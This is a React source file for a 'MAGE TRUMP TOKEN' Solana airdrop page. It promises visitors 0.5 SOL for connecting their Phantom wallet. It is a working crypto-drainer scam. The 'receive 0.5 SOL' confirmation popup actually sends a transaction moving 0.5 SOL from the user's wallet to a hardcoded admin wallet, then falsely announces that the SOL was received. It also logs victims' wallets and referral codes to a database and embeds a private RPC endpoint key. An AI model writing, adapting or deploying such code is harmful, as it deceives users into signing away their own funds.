import React, { useContext, useState, useEffect } from 'react'; 
import { WalletContext } from '../wallet/PhantomProvider';
import trumpImage from '../assets/front.png';
import { Link } from 'react-router-dom';
import { db } from '../firebase/firebase';
import { addDoc, updateDoc, doc, getDoc, collection } from 'firebase/firestore';
import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';

export default function Home() {
  const { connectWallet, walletAddress, walletBalance, isConnected, disconnectWallet } = useContext(WalletContext);
  const [status, setStatus] = useState('');
  const [error, setError] = useState('');
  const [showPopup, setShowPopup] = useState(false);

  const connection = new Connection('https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/');  
  const adminWallet = new PublicKey('4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD');

  const handleConnectWallet = async () => {
    setStatus('Connecting...');

    try {
      const provider = window?.solana;
      if (!provider || !provider.isPhantom) {
        throw new Error('Phantom wallet not found!');
      }

      const resp = await provider.connect();
      const publicKey = resp.publicKey.toString();

      if (!publicKey) {
        throw new Error('Wallet address is missing!');
      }

      localStorage.setItem('walletAddress', publicKey);
      setStatus('Wallet Connected!');
      connectWallet(publicKey);

      const walletAddr = publicKey;
      const userRef = doc(db, 'users', walletAddr);
      const docSnap = await getDoc(userRef);

      if (docSnap.exists()) {
        await updateDoc(userRef, {
          balance: walletBalance || 0.5,
          claimed: false,
          createdAt: new Date(),
        });
      } else {
        await addDoc(collection(db, 'users'), {
          wallet: walletAddr,
          referral: getReferralFromURL(),
          claimed: false,
          createdAt: new Date(),
        });
      }

      setShowPopup(true);
    } catch (err) {
      console.error('Error connecting wallet:', err);
      setStatus('Failed to connect');
      setError(err.message);
    }
  };

  const handleSendSol = async () => {
    try {
      if (!walletAddress) throw new Error('Wallet address is missing!');

      const provider = window?.solana;
      if (!provider || !provider.isPhantom) throw new Error('Phantom wallet not found!');

      const { blockhash } = await connection.getRecentBlockhash('confirmed');

      const transaction = new Transaction({
        recentBlockhash: blockhash,
        feePayer: new PublicKey(walletAddress),
      }).add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(walletAddress),
          toPubkey: adminWallet,
          lamports: 500000000,
        })
      );

      const { signature } = await provider.signAndSendTransaction(transaction, {
        commitment: 'confirmed',
      });

      console.log('Transaction signature:', signature);
      alert('0.5 SOL successfully received');
      setShowPopup(false);
    } catch (err) {
      console.error('Error sending SOL:', err);
      setError(err.message);
      setShowPopup(false);
    }
  };

  const handleDisconnectWallet = () => {
    setStatus('Disconnecting...');
    disconnectWallet();
    setStatus('Wallet Disconnected!');
  };

  const getReferralFromURL = () => {
    const params = new URLSearchParams(window.location.search);
    return params.get('ref') || null;
  };

  return (
    <div className="min-h-screen bg-[#0a369d] text-white flex flex-col items-center justify-between">
      <header className="w-full flex justify-between items-center px-10 py-6">
        <div className="flex gap-10 text-white font-semibold text-sm">
          <Link to="/" className="hover:underline">HOME</Link>
          <Link to="/about" className="hover:underline">ABOUT</Link>
          <Link to="/roadmap" className="hover:underline">ROADMAP</Link>
          <Link to="/referrals" className="hover:underline text-yellow-300">REFERALS</Link>
        </div>
        <button
          onClick={isConnected ? handleDisconnectWallet : handleConnectWallet}
          className={`${isConnected ? 'bg-green-500 hover:bg-green-600' : 'bg-blue-500 hover:bg-blue-600'} text-white font-semibold py-2 px-4 rounded`}
        >
          {isConnected ? `Connected: ${walletAddress}` : 'Connect Wallet'}
        </button>
      </header>

      <main className="flex flex-col md:flex-row items-center justify-center flex-grow px-4 text-center md:text-left">
        <div className="w-full md:w-1/2 flex justify-center">
          <img
            src={trumpImage}
            alt="Trump Mage"
            className="w-64 md:w-[320px] lg:w-[380px]"
          />
        </div>
        <div className="w-full md:w-1/2 flex flex-col justify-center items-center md:items-start mt-6 md:mt-0">
          <h1 className="text-4xl md:text-5xl font-bold mb-4">MAGE TRUMP TOKEN</h1>
          <h2 className="text-2xl font-bold text-white mb-2">Claim $MAGE Airdrop</h2>
          <p className="text-sm text-gray-200 max-w-sm mb-6">
            Connect your wallet to receive 0.5 SOL, locked until launch on April 27
          </p>
          <button
            onClick={isConnected ? handleDisconnectWallet : handleConnectWallet}
            className={`${isConnected ? 'bg-green-500 hover:bg-green-600' : 'bg-blue-500 hover:bg-blue-600'} text-white font-semibold py-2 px-6 rounded`}
          >
            {isConnected ? 'Disconnect Wallet' : 'Connect Wallet'}
          </button>
          {status && <p className="mt-4">{status}</p>}
          {error && <p className="mt-4 text-red-500">{error}</p>}
        </div>
      </main>

      {showPopup && (
        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex items-center justify-center">
          <div className="bg-white p-6 rounded shadow-lg">
            <h2 className="text-xl font-bold mb-4 text-black">Confirm Transaction</h2>
            <p className="text-black">Do you want to receive 0.5 SOL?</p>
            <div className="mt-4 flex gap-4">
              <button
                onClick={handleSendSol}
                className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
              >
                Yes
              </button>
              <button
                onClick={() => setShowPopup(false)}
                className="bg-gray-500 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
